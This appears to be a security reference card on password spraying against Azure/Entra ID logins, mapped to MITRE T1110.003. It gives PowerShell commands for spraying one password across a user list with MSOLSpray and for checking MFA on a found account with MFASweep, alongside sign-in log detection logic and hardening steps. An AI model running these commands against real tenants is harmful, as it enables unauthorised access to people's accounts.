# [CA-BRUTE-001]: Azure Portal Password Spray

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-BRUTE-001 |
| **MITRE ATT&CK v18.1** | [Password Spraying (T1110.003)](https://attack.mitre.org/techniques/T1110/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID / M365 |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Unlike traditional brute force (trying many passwords for one user), Password Spraying tries *one* common password (e.g., "Winter2025!") against *many* users. This avoids account lockouts. Entra ID has "Smart Lockout," but spraying remains effective if done slowly or against legacy endpoints (Autodiscover, EWS).
- **Attack Surface:** Public Endpoints (`login.microsoftonline.com`, `autodiscover.target.com`).
- **Business Impact:** **Initial Access**. Compromising users with weak passwords.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** None (Public).
- **Tools:**
    - [MSOLSpray](https://github.com/dafthack/MSOLSpray)
    - [MFASweep](https://github.com/dafthack/MFASweep)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Enumerate Users**
(See IA-RECON-004)

**Step 2: Spray**
```powershell
Invoke-MSOLSpray -UserList users.txt -Password "Welcome123!" -Verbose
```

**Step 3: Check MFA Status**
Once a valid credential is found, check if MFA is enforced or if you can enroll a new device.
```powershell
./MFASweep.ps1 -Username "found@target.com" -Password "Welcome123!"
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **SignInLogs** | `Sign-in error` | High volume of `50126` (Invalid username or password) or `50053` (Account locked) errors from a single IP range against multiple accounts. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Password Protection:** Enable **Entra Password Protection** (Azure AD Password Protection) to ban common terms like company names, seasons, and years globally.
*   **Disable Legacy Auth:** Block Legacy Authentication (SMTP, IMAP, POP) which doesn't support MFA and is the primary target for sprays.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-RECON-004] (User Enumeration)
> **Next Logical Step:** [CA-BRUTE-003] (MFA Bombing)
